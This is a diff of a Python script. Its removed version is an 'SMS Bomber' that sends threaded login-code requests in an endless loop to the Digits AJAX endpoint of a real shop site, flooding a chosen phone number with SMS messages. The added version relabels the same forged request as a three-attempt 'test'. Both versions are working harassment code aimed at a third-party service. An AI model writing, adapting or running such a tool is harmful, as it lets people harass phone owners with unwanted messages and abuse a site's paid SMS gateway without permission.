@@ -1,138 +1,85 @@
 from threading import Thread
 from time import sleep
 import requests
-import sys
 
+# ------------------------------
 # Colors
+# ------------------------------
 r = '\033[31;1m'
 g = '\033[32;1m'
 y = '\033[33;1m'
 p = '\033[35;1m'
 a = '\033[0m'
 
+# ------------------------------
 # Slow print
-def print_slow(text, delay=0.009):
+# ------------------------------
+def print_slow(text, delay=0.005):
     for char in text:
         print(char, end='', flush=True)
         sleep(delay)
     print()
 
 # ------------------------------
-# Ilozi SMS Service
+# Ilozi SMS API Test
 # ------------------------------
-
-def ilozi(phone):
+def ilozi_test(phone):
     url = "https://ilozi.com/wp-admin/admin-ajax.php"
-
     payload = {
+        "login_digt_countrycode": "+98",
+        "digits_phone": phone,
+        "action_type": "phone",
+        "digits": "1",
+        "instance_id": "6fb17492e0d343df4e533a9deb8ba6b9",  # ممکن است تغییر کند
         "action": "digits_forms_ajax",
         "type": "login",
-        "digits": "1",
-        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",
-        "action_type": "phone",
-        "digits_phone": phone,  # شماره بدون +98 و صفر اول
-        "login_digt_countrycode": "+98",
+        "digits_step_1_type": "",
+        "digits_step_1_value": "",
+        "digits_step_2_type": "",
+        "digits_step_2_value": "",
+        "digits_step_3_type": "",
+        "digits_step_3_value": "",
+        "digits_login_email_token": "",
+        "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
+        "digits_form": "3780032f76",
+        "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Filozi.com%2Fmy-account%2F%3Faction%3Dregister&page=2",
+        "show_force_title": "1"
     }
-
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36",
-        "Referer": "https://ilozi.com/",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "Accept": "*/*",
-        "Origin": "https://ilozi.com",
-        "Connection": "keep-alive",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
     }
 
     session = requests.Session()
     try:
-        # مرحله اول: گرفتن کوکی
-        session.get("https://ilozi.com", headers=headers, timeout=5)
-
-        # ارسال درخواست اصلی
-        response = session.post(url, data=payload, headers=headers, timeout=5)
-
-        if response.status_code == 200:
-            # سایت ممکن است متن خاصی در پاسخ داشته باشد که نشان دهد موفق بوده
-            if "success" in response.text.lower() or "sent" in response.text.lower():
-                print(f"{g}(Ilozi) Code Sent to {phone}{a}")
-                return True
-            else:
-                print(f"{y}[-] (Ilozi) Request OK but Code may not be sent{a}")
-                return False
+        session.get("https://ilozi.com", headers=headers, timeout=5)  # گرفتن کوکی اولیه
+        resp = session.post(url, data=payload, headers=headers, timeout=5)
+        if resp.status_code == 200 and ("success" in resp.text.lower() or "sent" in resp.text.lower()):
+            print(f"{g}[+] Test SMS Sent to {phone}{a}")
         else:
-            print(f"{r}[-] (Ilozi) Failed, Status: {response.status_code}{a}")
-            return False
+            print(f"{y}[-] Request sent but response may not be successful{a}")
     except Exception as e:
-        print(f"{r}[!] Ilozi Exception: {e}{a}")
-        return False
+        print(f"{r}[!] Exception: {e}{a}")
 
 # ------------------------------
-# SMS Bomber Core
+# Run multiple threads safely
 # ------------------------------
-def run_service(service, phone):
-    try:
-        service(phone)
-    except Exception as e:
-        print(f"{r}[!] {service.__name__} Exception: {e}{a}")
-
-def Vip(phone, delay_time):
-    services = [ilozi]
-    print_slow(f"{p}╔═════[ SMS Bomber Initiated ]═════╗")
+def run_test(phone, delay=1, count=3):
+    print_slow(f"{p}╔═════[ Ilozi SMS Test ]═════╗")
     print_slow(f"{g}Target: {y}{phone}")
-    print_slow(f"{g}Services: {y}{len(services)}")
-    print_slow(f"{g}Delay: {y}{delay_time}s")
-    print_slow(f"{p}╚═══════════════════════════════════╝")
-    sleep(1)
-
-    try:
-        while True:
-            for service in services:
-                Thread(target=run_service, args=(service, phone)).start()
-                sleep(delay_time)
-    except KeyboardInterrupt:
-        print_slow(f"{g}[+] Bomber Stopped!{a}")
+    print_slow(f"{g}Delay between requests: {y}{delay}s")
+    print_slow(f"{g}Total Attempts: {y}{count}")
+    print_slow(f"{p}╚════════════════════════════╝")
+    
+    for i in range(count):
+        Thread(target=ilozi_test, args=(phone,)).start()
+        sleep(delay)
 
 # ------------------------------
-# Phone validation
+# Main
 # ------------------------------
-from re import match, sub
-def is_phone(phone: str):
-    if match(r"^\d{10}$", phone):  # فقط 10 رقم
-        return phone
-    return False
-
-# ------------------------------
-# Menu
-# ------------------------------
-def main_menu():
-    print_slow("""
-╔════════════════════════════════╗
-║       ⟬ Bomber Plus Tool ⟭    ║
-╚════════════════════════════════╝
-Choose an Option:
-    [1] SMS Bomber
-    [0] Exit
-""")
-    return input("Enter Choice: ")
-
-def main():
-    while True:
-        choice = main_menu()
-        if choice == "1":
-            phone = input("Enter Phone (e.g. 9173644430): ")
-            phone = is_phone(phone)
-            if not phone:
-                print("Invalid Phone!")
-                continue
-            try:
-                delay_time = float(input("Delay (seconds, default 0.1): ") or 0.1)
-            except ValueError:
-                delay_time = 0.1
-            Vip(phone, delay_time)
-        elif choice == "0":
-            print("Exiting...")
-            break
-        else:
-            print("Invalid Choice!")
-
 if __name__ == "__main__":
-    main()
+    phone = input("Enter your phone (e.g. 9173644430): ")
+    run_test(phone, delay=1, count=3)
